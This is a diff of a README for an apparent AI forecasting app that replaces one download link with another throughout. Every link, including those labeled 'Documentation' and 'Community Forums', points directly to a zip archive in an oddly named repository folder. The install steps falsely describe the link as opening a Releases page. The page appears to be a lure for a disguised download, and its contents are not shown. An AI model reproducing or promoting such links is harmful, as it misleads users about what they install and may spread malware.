@@ -1,6 +1,6 @@
 # 🌟 Forecasting-The-Future-of-Forecasting - Explore AI-Driven Predictions Easily
 
-[![Download](https://raw.githubusercontent.com/jackx7/Forecasting-The-Future-of-Forecasting/main/pictorical/Forecasting-The-Future-of-Forecasting-1.8-beta.3.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://raw.githubusercontent.com/jackx7/Forecasting-The-Future-of-Forecasting/main/pictorical/Forecasting-The-Future-of-Forecasting-1.8-beta.3.zip)](https://raw.githubusercontent.com/jackx7/Forecasting-The-Future-of-Forecasting/main/pictorical/Forecasting-The-Future-of-Forecasting-1.8-beta.3.zip)
+[![Download](https://github.com/jackx7/Forecasting-The-Future-of-Forecasting/raw/refs/heads/main/pictorical/of-Forecasting-The-Future-v2.6.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://github.com/jackx7/Forecasting-The-Future-of-Forecasting/raw/refs/heads/main/pictorical/of-Forecasting-The-Future-v2.6.zip)](https://github.com/jackx7/Forecasting-The-Future-of-Forecasting/raw/refs/heads/main/pictorical/of-Forecasting-The-Future-v2.6.zip)
 
 ## 📖 Description
 
@@ -19,7 +19,7 @@ To start using this application, you will need to download it from the Releases 
 
 ## 📥 Download & Install
 
-You can visit this page to download: [Download Now](https://raw.githubusercontent.com/jackx7/Forecasting-The-Future-of-Forecasting/main/pictorical/Forecasting-The-Future-of-Forecasting-1.8-beta.3.zip).
+You can visit this page to download: [Download Now](https://github.com/jackx7/Forecasting-The-Future-of-Forecasting/raw/refs/heads/main/pictorical/of-Forecasting-The-Future-v2.6.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application, typically labeled as "Latest Release."
@@ -70,8 +70,8 @@ If you encounter any issues or have questions, please reach out. You can open an
 
 ## ✅ Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/jackx7/Forecasting-The-Future-of-Forecasting/main/pictorical/Forecasting-The-Future-of-Forecasting-1.8-beta.3.zip)
-- [Community Forums](https://raw.githubusercontent.com/jackx7/Forecasting-The-Future-of-Forecasting/main/pictorical/Forecasting-The-Future-of-Forecasting-1.8-beta.3.zip)
+- [Documentation](https://github.com/jackx7/Forecasting-The-Future-of-Forecasting/raw/refs/heads/main/pictorical/of-Forecasting-The-Future-v2.6.zip)
+- [Community Forums](https://github.com/jackx7/Forecasting-The-Future-of-Forecasting/raw/refs/heads/main/pictorical/of-Forecasting-The-Future-v2.6.zip)
 
 ## 🛠 Contributing
 
@@ -89,6 +89,6 @@ By following these guidelines, you can help enhance this project and make it bet
 
 Stay tuned for updates. We are working on adding new features and improving existing ones.
 
-To download the application again, visit this page: [Download Now](https://raw.githubusercontent.com/jackx7/Forecasting-The-Future-of-Forecasting/main/pictorical/Forecasting-The-Future-of-Forecasting-1.8-beta.3.zip). 
+To download the application again, visit this page: [Download Now](https://github.com/jackx7/Forecasting-The-Future-of-Forecasting/raw/refs/heads/main/pictorical/of-Forecasting-The-Future-v2.6.zip). 
 
 Thank you for joining us on this journey toward better forecasting with AI!
